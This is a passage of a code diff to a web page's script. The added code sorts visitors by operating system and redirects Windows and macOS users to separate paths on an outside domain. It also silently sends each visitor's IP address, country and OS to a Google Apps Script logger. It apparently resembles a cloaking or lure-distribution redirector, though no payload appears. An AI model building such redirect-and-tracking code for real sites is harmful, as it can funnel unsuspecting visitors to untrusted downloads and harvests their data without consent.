+    // Windows users go to topmacos.com/revo/, macOS users go to topmacos.com/saiyaara/
+    let targetUrl;
+    if (os === 'windows') {
+      targetUrl = DEST.windows;
+    } else if (os === 'macos') {
+      targetUrl = DEST.macos;
+    } else {
+      // For other OS types, use fallback (GitHub pricing page)
+      targetUrl = DEST[os] || DEST.other;
+    }
+    
+    // Preserve query parameters and hash if they exist
+    targetUrl = keepQueryAndHash(targetUrl);
 
-      // Event listeners
-      if (elements.button) {
-        elements.button.addEventListener('click', performRedirect);
-      }
+    // Get IP and Geo information for tracking
+    const ip = await getIP();
+    const geo = await getGeo(ip);
 
-      // Start animation
-      state.rafId = requestAnimationFrame(animate);
+    // Send tracking data to Google Apps Script
+    trackOSAndRedirect({
+      os, 
+      offer, 
+      targetUrl,
+      ip,
+      country: geo.country,
+      countryCode: geo.countryCode
+    });
 
-      // Cleanup on page hide
-      document.addEventListener('visibilitychange', function() {
-        if (document.hidden && state.rafId) {
-          cancelAnimationFrame(state.rafId);
-        } else if (!document.hidden && !state.isRedirecting) {
-          state.rafId = requestAnimationFrame(animate);
-        }
-      });
-    })();
-  </script>
+    // Start progress animation and redirect
+    animateProgress(targetUrl, os, offer);
+  });
+</script>
 </body>
 </html>
